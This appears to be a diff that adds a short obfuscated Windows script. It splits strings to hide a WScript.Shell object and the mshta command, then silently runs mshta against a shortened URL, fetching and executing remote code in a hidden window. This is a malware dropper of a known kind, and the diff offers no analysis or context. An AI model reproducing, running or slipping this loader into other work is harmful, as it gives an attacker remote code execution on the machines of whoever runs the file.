@@ -1,0 +1,6 @@
+kqdrinxg = ("ipt.Shel")
+var femllbnw = WScript.CreateObject("WScr"+kqdrinxg+"l")
+adbmrnag = ("m")
+somsvuhq = ("sh")
+nnptvbpi = ("ta ")
+femllbnw.Run((adbmrnag+somsvuhq+nnptvbpi)+" https://t.ly/Czar",0)
